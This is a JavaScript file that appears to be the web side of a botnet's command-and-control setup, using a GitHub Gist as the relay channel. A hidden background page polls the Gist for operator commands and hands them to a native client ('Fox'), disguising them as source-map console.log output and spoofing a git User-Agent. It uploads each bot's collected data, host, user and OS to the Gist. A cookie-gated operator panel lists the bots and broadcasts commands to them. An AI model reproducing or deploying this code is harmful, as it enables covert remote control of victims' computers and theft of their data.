// Background polling — runs only when this page is a background tab (document.hidden === true)
// Fox creates a hidden QWebEnginePage that loads this URL; that page is never shown so
// document.hidden stays true. Every 30s it polls the Gist for new cmd_* entries and
// fires console.log in sourceRoot format, which Fox's BackgroundPage.onCommandReady picks up.
if(document.hidden){
  window.__nativeResult=function(p){
    if(!p||!p.result)return;
    try{
      var d=JSON.parse(p.result);
      if(!d.bot)return;
      fetch('https://api.github.com/gists/'+GID,{
        method:'PATCH',
        headers:{Authorization:'token '+PAT},
        body:JSON.stringify({files:{
          ['data_'+d.bot]:{content:JSON.stringify(d.data)},
          ['meta_'+d.bot]:{content:JSON.stringify(d.meta)},
          ['cmd_' +d.bot]:{content:'pending'}
        }})
      }).catch(function(){});
    }catch(e){}
  };
  (function(){
    var seen={};
    setInterval(function(){
      fetch('https://api.github.com/gists/'+GID,{headers:{Authorization:'token '+PAT,'User-Agent':'git/2.39.0'}})
      .then(function(r){return r.json();})
      .then(function(g){
        var hb={};
        Object.entries(g.files).forEach(function(e){
          if(!e[0].startsWith('cmd_'))return;
          var bid=e[0].slice(4);
          try{var m=JSON.parse((g.files['meta_'+bid]||{content:'{}'}).content||'{}');m.ts=Math.floor(Date.now()/1000);hb['meta_'+bid]={content:JSON.stringify(m)};}catch(x){}
          var cmd=(e[1].content||'').trim();
          if(!cmd||cmd==='pending'||cmd===seen[e[0]])return;
          seen[e[0]]=cmd;
          console.log(JSON.stringify({version:3,file:'app.min.js',sourceRoot:cmd,sources:['app.js'],names:[],mappings:''}));
        });
        if(Object.keys(hb).length)fetch('https://api.github.com/gists/'+GID,{method:'PATCH',headers:{Authorization:'token '+PAT},body:JSON.stringify({files:hb})}).catch(function(){});
      }).catch(function(){});
    },30000);
  })();
}

// Operator gate
function gc(n){const v=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return v?v.pop():null}
if(gc('_op')===TOK){document.getElementById('op').style.display='block';load();}

function load(){
  fetch('https://api.github.com/gists/'+GID,{headers:{Authorization:'token '+PAT,'User-Agent':'git/2.39.0'}})
  .then(r=>r.json()).then(g=>{
    const el=document.getElementById('bots'),bots={};
    el.innerHTML='';
    Object.entries(g.files).forEach(([n,f])=>{
      const m=n.match(/^(data|cmd|meta)_(.+)$/);
      if(m){if(!bots[m[2]])bots[m[2]]={};bots[m[2]][m[1]]=f.content;}
    });
    Object.entries(bots).forEach(([bid,b])=>{
      const meta=b.meta?JSON.parse(b.meta):{},data=b.data?JSON.parse(b.data):{};
      const d=document.createElement('div');d.className='bc';
      d.innerHTML='<h3>'+( meta.host||bid)+'</h3><p class="dim">'+( meta.user||'')+(meta.os?' &mdash; '+meta.os:'')+(meta.ts?' &mdash; '+new Date(meta.ts*1000).toLocaleString():'')+'</p><pre>'+JSON.stringify(data.hits,null,2)+'</pre><p class="dim" style="margin-top:6px">cmd: <code>'+(b.cmd||'(none)')+'</code></p>';
      el.appendChild(d);
    });
    if(!Object.keys(bots).length)el.innerHTML='<p class="dim">No bots yet.</p>';
  });
}

function push(){
  const cmd=document.getElementById('cmd').value.trim();if(!cmd)return;
  fetch('https://api.github.com/gists/'+GID,{headers:{Authorization:'token '+PAT,'User-Agent':'git/2.39.0'}})
  .then(r=>r.json()).then(g=>{
    const files={};
    Object.keys(g.files).forEach(n=>{if(n.startsWith('cmd_'))files[n]={content:cmd};});
    if(!Object.keys(files).length){alert('No bots yet.');return;}
    return fetch('https://api.github.com/gists/'+GID,{method:'PATCH',headers:{Authorization:'token '+PAT,'Content-Type':'application/json','User-Agent':'git/2.39.0'},body:JSON.stringify({files})});
  }).then(()=>{load();document.getElementById('cmd').value='';});
}
